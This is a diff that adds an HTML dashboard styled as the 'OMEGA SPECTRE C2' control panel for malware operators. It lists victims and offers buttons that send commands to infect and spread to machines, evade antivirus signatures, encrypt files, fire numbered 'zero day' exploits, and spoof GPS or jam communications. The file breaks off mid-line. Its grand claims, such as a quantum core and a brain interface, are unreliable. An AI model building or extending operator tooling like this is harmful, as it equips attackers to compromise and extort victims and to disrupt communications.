@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OMEGA SPECTRE C2 - CONTROL PANEL</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .header { text-align: center; padding: 20px; border-bottom: 2px solid #00ff00; margin-bottom: 30px; }
+        .header h1 { color: #ff0044; font-size: 28px; text-shadow: 0 0 20px #ff004488; }
+        .header p { color: #00ff00; font-size: 14px; }
+        .stats { display: flex; gap: 20px; justify-content: center; margin-bottom: 30px; flex-wrap: wrap; }
+        .stat-card { background: #111; padding: 15px 25px; border-radius: 10px; border: 1px solid #00ff0055; text-align: center; }
+        .stat-card h3 { color: #888; font-size: 12px; }
+        .stat-card .value { color: #00ff00; font-size: 24px; }
+        .category { background: #111; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #222; }
+        .category h2 { color: #ff0044; font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+        .file-card { background: #1a1a1a; border-radius: 8px; padding: 15px; border: 1px solid #333; transition: 0.3s; }
+        .file-card:hover { border-color: #00ff00; }
+        .file-card .file-name { color: #00ff00; font-size: 14px; margin-bottom: 8px; }
+        .file-card .file-path { color: #666; font-size: 11px; margin-bottom: 10px; }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; }
+        .btn { padding: 6px 12px; border: none; border-radius: 5px; font-size: 11px; cursor: pointer; transition: 0.3s; font-family: inherit; }
+        .btn-execute { background: #00ff00; color: #0a0a0a; }
+        .btn-execute:hover { background: #00cc00; transform: scale(1.05); }
+        .btn-burn { background: #ff0044; color: #fff; }
+        .btn-burn:hover { background: #cc0033; transform: scale(1.05); }
+        .btn-scan { background: #0066ff; color: #fff; }
+        .btn-scan:hover { background: #0055cc; transform: scale(1.05); }
+        .btn-hijack { background: #ff8800; color: #fff; }
+        .btn-hijack:hover { background: #cc6600; transform: scale(1.05); }
+        .btn-kill { background: #8800ff; color: #fff; }
+        .btn-kill:hover { background: #6600cc; transform: scale(1.05); }
+        .btn-encrypt { background: #00ccff; color: #0a0a0a; }
+        .btn-encrypt:hover { background: #0099cc; transform: scale(1.05); }
+        .footer { text-align: center; padding: 20px; color: #444; font-size: 12px; border-top: 1px solid #222; margin-top: 30px; }
+        .victim-select { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 8px 12px; border-radius: 5px; margin-bottom: 15px; width: 100%; max-width: 300px; }
+        .status-bar { background: #111; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; }
+        .status-bar .online { color: #00ff00; }
+        .status-bar .offline { color: #ff0044; }
+        .command-log { background: #0a0a0a; border: 1px solid #222; border-radius: 8px; padding: 15px; max-height: 200px; overflow-y: auto; font-size: 12px; margin-top: 20px; }
+        .command-log .log-entry { padding: 3px 0; border-bottom: 1px solid #111; }
+        .command-log .log-entry .time { color: #666; margin-right: 10px; }
+        .command-log .log-entry .success { color: #00ff00; }
+        .command-log .log-entry .error { color: #ff0044; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>☠️ OMEGA SPECTRE C2</h1>
+    <p>Ultimate Control Panel — All Files Under Your Command</p>
+</div>
+
+<div class="stats" id="stats">
+    <div class="stat-card"><h3>Total Victims</h3><div class="value" id="totalVictims">0</div></div>
+    <div class="stat-card"><h3>Active Victims</h3><div class="value" id="activeVictims">0</div></div>
+    <div class="stat-card"><h3>Total Files</h3><div class="value" id="totalFiles">165</div></div>
+    <div class="stat-card"><h3>Commands Sent</h3><div class="value" id="commandsSent">0</div></div>
+</div>
+
+<div class="status-bar">
+    <span>🟢 Server: <span class="online">Online</span></span>
+    <span>📡 C2: <span class="online">Active</span></span>
+    <span>🎯 Target: <span id="selectedVictim">None</span></span>
+</div>
+
+<div>
+    <label style="color:#888;font-size:12px;">Select Victim:</label>
+    <select class="victim-select" id="victimSelect" onchange="updateSelectedVictim()">
+        <option value="all">All Victims</option>
+        <option value="victim_001">Victim_001</option>
+        <option value="victim_002">Victim_002</option>
+    </select>
+</div>
+
+<!-- ============================================================ -->
+<!-- QUANTUM CORE -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>⚛️ QUANTUM CORE (512-bit)</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">q_engine.py</div>
+            <div class="file-path">quantum_core/q_engine.py</div>
+            <div class="btn-group">
+                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_engine.py --encrypt')">🔐 Encrypt</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_engine.py --decrypt')">🔓 Decrypt</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_engine.py --generate')">⚡ Generate</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">q_random.py</div>
+            <div class="file-path">quantum_core/q_random.py</div>
+            <div class="btn-group">
+                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_random.py --generate')">🎲 Generate</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_random.py --seed')">🌱 Seed</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">q_entanglement.py</div>
+            <div class="file-path">quantum_core/q_entanglement.py</div>
+            <div class="btn-group">
+                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_entanglement.py --entangle')">🌀 Entangle</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_entanglement.py --measure')">📊 Measure</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- AI AUTOPILOT -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>🧠 AI AUTOPILOT</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">neural_selector.py</div>
+            <div class="file-path">ai_autopilot/neural_selector.py</div>
+            <div class="btn-group">
+                <button class="btn btn-scan" onclick="sendCommand('ai_autopilot/neural_selector.py --scan')">🔍 Scan</button>
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/neural_selector.py --select')">🎯 Select</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">attack_planner.py</div>
+            <div class="file-path">ai_autopilot/attack_planner.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/attack_planner.py --plan')">📋 Plan</button>
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/attack_planner.py --execute')">⚡ Execute</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">evasion_learner.py</div>
+            <div class="file-path">ai_autopilot/evasion_learner.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/evasion_learner.py --learn')">📖 Learn</button>
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/evasion_learner.py --evade')">👻 Evade</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">self_improve.py</div>
+            <div class="file-path">ai_autopilot/self_improve.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/self_improve.py --improve')">📈 Improve</button>
+                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/self_improve.py --mutate')">🧬 Mutate</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MUTATION ENGINE -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>🧬 MUTATION ENGINE</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">polymorphic_gen.py</div>
+            <div class="file-path">mutation_engine/polymorphic_gen.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/polymorphic_gen.py --mutate')">🔄 Mutate</button>
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/polymorphic_gen.py --generate')">⚡ Generate</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">metamorphic_asm.py</div>
+            <div class="file-path">mutation_engine/metamorphic_asm.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/metamorphic_asm.py --transform')">🔄 Transform</button>
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/metamorphic_asm.py --asm')">⚡ ASM</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">signature_killer.py</div>
+            <div class="file-path">mutation_engine/signature_killer.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/signature_killer.py --kill')">💀 Kill</button>
+                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/signature_killer.py --wipe')">🧹 Wipe</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MESH NETWORK -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>🕸️ MESH NETWORK</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">p2p_comm.py</div>
+            <div class="file-path">mesh_network/p2p_comm.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/p2p_comm.py --connect')">🔗 Connect</button>
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/p2p_comm.py --broadcast')">📢 Broadcast</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">zombie_spreader.py</div>
+            <div class="file-path">mesh_network/zombie_spreader.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/zombie_spreader.py --spread')">🧟 Spread</button>
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/zombie_spreader.py --infect')">🦠 Infect</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">decentralized_c2.py</div>
+            <div class="file-path">mesh_network/decentralized_c2.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/decentralized_c2.py --deploy')">🚀 Deploy</button>
+                <button class="btn btn-execute" onclick="sendCommand('mesh_network/decentralized_c2.py --control')">🎮 Control</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- MILITARY JAMMING -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>📡 MILITARY JAMMING</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">freq_jammer.py</div>
+            <div class="file-path">military_jamming/freq_jammer.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/freq_jammer.py --jam')">📡 Jam</button>
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/freq_jammer.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">radar_blinder.py</div>
+            <div class="file-path">military_jamming/radar_blinder.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/radar_blinder.py --blind')">👁️ Blind</button>
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/radar_blinder.py --reset')">🔄 Reset</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">gps_spoofer.py</div>
+            <div class="file-path">military_jamming/gps_spoofer.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/gps_spoofer.py --spoof')">🛰️ Spoof</button>
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/gps_spoofer.py --restore')">🔄 Restore</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">comm_disruptor.py</div>
+            <div class="file-path">military_jamming/comm_disruptor.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/comm_disruptor.py --disrupt')">📵 Disrupt</button>
+                <button class="btn btn-execute" onclick="sendCommand('military_jamming/comm_disruptor.py --restore')">🔄 Restore</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- QUANTUM RESISTANT -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>🔐 QUANTUM RESISTANT</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">kyber_encrypt.py</div>
+            <div class="file-path">quantum_resistant/kyber_encrypt.py</div>
+            <div class="btn-group">
+                <button class="btn btn-encrypt" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --encrypt')">🔐 Encrypt</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --decrypt')">🔓 Decrypt</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --keygen')">🔑 Keygen</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">dilithium_sign.py</div>
+            <div class="file-path">quantum_resistant/dilithium_sign.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/dilithium_sign.py --sign')">✍️ Sign</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/dilithium_sign.py --verify')">✅ Verify</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">sphincs_hash.py</div>
+            <div class="file-path">quantum_resistant/sphincs_hash.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/sphincs_hash.py --hash')">🔢 Hash</button>
+                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/sphincs_hash.py --verify')">✅ Verify</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- ZERO DAY VAULT -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>💀 ZERO DAY VAULT</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">cve_2025_001.py</div>
+            <div class="file-path">zero_day_vault/cve_2025_001.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_001.py --exploit')">💥 Exploit</button>
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_001.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">cve_2025_002.py</div>
+            <div class="file-path">zero_day_vault/cve_2025_002.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_002.py --exploit')">💥 Exploit</button>
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_002.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">cve_2025_003.py</div>
+            <div class="file-path">zero_day_vault/cve_2025_003.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_003.py --exploit')">💥 Exploit</button>
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_003.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">cve_2025_004.py</div>
+            <div class="file-path">zero_day_vault/cve_2025_004.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_004.py --exploit')">💥 Exploit</button>
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_004.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+        <div class="file-card">
+            <div class="file-name">cve_2025_005.py</div>
+            <div class="file-path">zero_day_vault/cve_2025_005.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_005.py --exploit')">💥 Exploit</button>
+                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_005.py --scan')">🔍 Scan</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- FULL CONTROL -->
+<!-- ============================================================ -->
+<div class="category">
+    <h2>🎮 FULL CONTROL</h2>
+    <div class="file-grid">
+        <div class="file-card">
+            <div class="file-name">brain_interface.py</div>
+            <div class="file-path">full_control/brain_interface.py</div>
+            <div class="btn-group">
+                <button class="btn btn-execute" onclick="sendCommand('full_control/brain_interface.py --c
